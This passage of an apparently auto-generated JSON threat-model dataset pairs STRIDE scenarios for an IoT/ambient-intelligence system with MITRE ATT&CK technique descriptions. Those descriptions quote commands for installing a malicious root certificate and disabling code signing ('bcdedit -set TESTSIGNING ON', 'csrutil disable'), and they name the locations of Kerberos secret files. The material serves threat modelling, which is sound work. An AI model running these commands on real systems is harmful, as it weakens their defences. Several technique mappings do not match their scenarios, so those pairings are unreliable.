                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake biometric to gain access through biometric-based authentication.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have access to biometric data or can create fake biometric samples.",
                    "Role": "Attacker",
                    "Condition": "Availability of biometric data from compromised sources."
                },
                {
                    "Assumption": "Biometric systems are not equipped to detect fake biometrics effectively.",
                    "Role": "System Designer",
                    "Condition": "Lack of sophisticated detection mechanisms for fake biometrics."
                }
            ],
            "Potential Impact": "Unauthorized system access and data disclosure.",
            "MITRE ATT&CK Keywords": [
                "biometric spoofing",
                "authentication bypass",
                "fake biometrics"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters data from sensors before it reaches the data repository.",
            "Assumptions": [
                {
                    "Assumption": "Data from sensors is transmitted over an unsecured network.",
                    "Role": "System Architect",
                    "Condition": "Transmission without encryption."
                },
                {
                    "Assumption": "The attacker has access to the communication channels.",
                    "Role": "Attacker",
                    "Condition": "Able to place a man-in-the-middle device or exploit network vulnerabilities."
                }
            ],
            "Potential Impact": "Corrupted sensor data leading to incorrect decisions by the AI/ML models.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "man-in-the-middle",
                "sensor data"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An actor gains unauthorized physical access to tamper with actuator settings.",
            "Assumptions": [
                {
                    "Assumption": "Physical security measures are insufficient.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of surveillance and restricted access controls."
                },
                {
                    "Assumption": "Actuator settings are manually adjustable.",
                    "Role": "System Designer",
                    "Condition": "Actuators can be manually overridden."
                }
            ],
            "Potential Impact": "Compromised physical functions like lighting, temperature control, and access control.",
            "MITRE ATT&CK Keywords": [
                "physical tampering",
                "actuator manipulation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware infects the data repository and modifies user profiles and system configuration settings.",
            "Assumptions": [
                {
                    "Assumption": "The data repository is inadequately protected against malware.",
                    "Role": "Network Security Engineer",
                    "Condition": "Lack of comprehensive anti-malware measures."
                },
                {
                    "Assumption": "Malware propagation is possible through the network.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities that allow malware spread."
                }
            ],
            "Potential Impact": "Altered user experiences and potential system malfunction.",
            "MITRE ATT&CK Keywords": [
                "malware infection",
                "data corruption",
                "configuration tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing specific actions in the system, such as changing smart thermostat settings.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks proper logging and auditing mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "No comprehensive logging of user activity."
                },
                {
                    "Assumption": "Authentication mechanisms do not provide non-repudiation guarantees.",
                    "Role": "System Designer",
                    "Condition": "Weak authentication or lack of traceable actions."
                }
            ],
            "Potential Impact": "Disputes over changes and loss of accountability.",
            "MITRE ATT&CK Keywords": [
                "action denial",
                "lack of audit logs",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00270580-d7e8-4bda-830c-96d702794b26",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker fabricates logs to show false activities within the system.",
            "Assumptions": [
                {
                    "Assumption": "Log files can be accessed and modified.",
                    "Role": "System Administrator",
                    "Condition": "Logs are stored without integrity protection."
                },
                {
                    "Assumption": "There is no mechanism to verify the authenticity of log entries.",
                    "Role": "System Designer",
                    "Condition": "Lack of digital sign-off or checksum validation for logs."
                }
            ],
            "Potential Impact": "Misleading forensic analysis and hindered incident response.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "forensic evasion",
                "fabricated logs"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user manipulates time-stamps in logs to repudiate certain actions.",
            "Assumptions": [
                {
                    "Assumption": "Log entries are not time-synchronized with a secure time source.",
                    "Role": "System Administrator",
                    "Condition": "Time-stamping without synchronization with a secure service."
                },
                {
                    "Assumption": "Users have permission to edit log entries.",
                    "Role": "System Designer",
                    "Condition": "Log edit permissions are not sufficiently restricted."
                }
            ],
            "Potential Impact": "Loss of chronological integrity and difficulty in incident analysis.",
            "MITRE ATT&CK Keywords": [
                "time-stamp manipulation",
                "log forgery",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive biometric data is intercepted during transmission from sensors to data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted unencrypted over the network.",
                    "Role": "System Architect",
                    "Condition": "Biometric data is sent without encryption."
                },
                {
                    "Assumption": "Attackers can access transmission channels.",
                    "Role": "Attacker",
                    "Condition": "Positioned to intercept or listen to data streams."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of personal biometric information.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "biometric data",
                "network eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to cloud storage where user profiles and historical data are kept.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not adequately secured.",
                    "Role": "Cloud Engineer",
                    "Condition": "Weak access controls or improper cloud configurations."
                },
                {
                    "Assumption": "Attackers have identified and exploiting vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of cloud storage flaws or vulnerabilities."
                }
            ],
            "Potential Impact": "Exposure of user data including preferences and historical interaction logs.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "unauthorized access",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data leaks through improperly configured APIs that allow unauthorized data retrieval.",
            "Assumptions": [
                {
                    "Assumption": "APIs lack proper authentication checks.",
                    "Role": "API Developer",
                    "Condition": "APIs are exposed without strong authentication."
                },
                {
                    "Assumption": "The attacker can discover and exploit API endpoints.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of API structure and vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data via API endpoints.",
            "MITRE ATT&CK Keywords": [
                "API misconfiguration",
                "unauthorized data access",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with excessive traffic, causing system slowdowns or crashes.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not monitored or controlled.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of network monitoring tools or bandwidth management."
                },
                {
                    "Assumption": "The attacker can generate high volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to resources to launch a DDoS attack."
                }
            ],
            "Potential Impact": "Reduced availability of the AmI system and potential service disruptions.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "network flooding",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects actuators, causing them to malfunction and overloading the system.",
            "Assumptions": [
                {
                    "Assumption": "Actuators lack appropriate security measures.",
                    "Role": "Embedded Systems Engineer",
                    "Condition": "No anti-malware protection for devices."
                },
                {
                    "Assumption": "The attacker can deploy malware to actuators.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of actuator vulnerabilities or attack vectors."
                }
            ],
            "Potential Impact": "Impaired physical systems and overall system instability.",
            "MITRE ATT&CK Keywords": [
                "malware infection",
                "actuator malfunction",
                "DoS"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of known vulnerabilities in communication infrastructure to disrupt data flow.",
            "Assumptions": [
                {
                    "Assumption": "Communication infrastructure is not regularly updated.",
                    "Role": "IT Security Administrator",
                    "Condition": "Failure to apply security patches."
                },
                {
                    "Assumption": "The attacker has knowledge of existing vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access to vulnerability databases and exploit scripts."
                }
            ],
            "Potential Impact": "Interruptions in data transmission and loss of system coordination.",
            "MITRE ATT&CK Keywords": [
                "network exploit",
                "vulnerability exploitation",
                "data disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain higher privileges on user devices.",
            "Assumptions": [
                {
                    "Assumption": "User devices are running vulnerable software versions.",
                    "Role": "End User",
                    "Condition": "Use of outdated or unpatched software."
                },
                {
                    "Assumption": "The attacker knows how to exploit these software vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of vulnerabilities and exploits."
                }
            ],
            "Potential Impact": "Full control over user devices and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "software exploit",
                "user device"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware infects AI/ML models to alter decision-making processes.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML models have not been secured against tampering.",
                    "Role": "AI Engineer",
                    "Condition": "Lack of integrity checks and security measures."
                },
                {
                    "Assumption": "The attacker can introduce malware into the system.",
                    "Role": "Attacker",
                    "Condition": "Access to deployment environment or data pipeline."
                }
            ],
            "Potential Impact": "Compromised decision-making processes leading to undesirable outcomes.",
            "MITRE ATT&CK Keywords": [
                "model tampering",
                "malware infection",
                "AI manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of weak authentication mechanisms to gain administrative access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "System relies on weak authentication methods.",
                    "Role": "System Architect",
                    "Condition": "Use of easily guessable or reusable credentials."
                },
                {
                    "Assumption": "The attacker can perform brute-force or other attacks on authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Ability to test multiple credential combinations."
                }
            ],
            "Potential Impact": "Unauthorized administrative actions and system take-over.",
            "MITRE ATT&CK Keywords": [
                "weak authentication",
                "admin access",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Code Signing Policy Modification",
                "description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",
                "id": "attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c",
                "technique_id": "T1553.006"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate user's biometric data to gain unauthorized access to the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to a legitimate user's biometric data.",
                    "Role": "Attacker",
                    "Condition": "Obtained by various means (e.g., from unauthorized access to public data, physical extraction)."
                },
                {
                    "Assumption": "The IoT system lacks multi-factor authentication processes for biometric data.",
                    "Role": "System Administrator",
                    "Condition": "System configuration only relies on single-factor biometric authentication."
                },
                {
                    "Assumption": "Biometric recognition software has vulnerabilities that can be exploited.",
                    "Role": "Software Developer",
                    "Condition": "Software has known or unknown vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data and control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric data",
                "unauthorized access",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Steal or Forge Kerberos Tickets",
                "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n",
                "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
                "technique_id": "T1558"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised smart card to impersonate a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker's smart card has already been compromised.",
                    "Role": "Attacker",
                    "Condition": "Physical theft or malicious duplication of the smart card."
                },
                {
                    "Assumption": "The authentication system doesn't effectively validate smart card usage.",
                    "Role": "System Administrator",
                    "Condition": "Weak validation or no additional security measures for smart card authentication."
                },
                {
                    "Assumption": "The system fails to detect unusual login activity.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient audit logs and monitoring alerts."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive areas and information.",
            "MITRE ATT&CK Keywords": [
                "smart card",
                "spoofing",
                "credential theft",
                "access control"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker utilizes Malware to manipulate the communication infrastructure and masquerade as a legitimate network device.",
            "Assumptions": [
                {
                    "Assumption": "Malware has been successfully introduced into the communication infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Known vulnerabilities in networking protocols exploited."
                },
                {
                    "Assumption": "Network detection and prevention systems are not robust enough.",
                    "Role": "Network Engineer",
                    "Condition": "Insufficient IDS/IPS configuration."
                },
                {
                    "Assumption": "IoT system lacks continuous monitoring and anomaly detection.",
                    "Role": "System Administrator",
                    "Condition": "Absence of real-time monitoring solutions."
                }
            ],
            "Potential Impact": "Disruption of system operations and unauthorized data interception.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network device",
                "communication infrastructure",
                "malware"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, 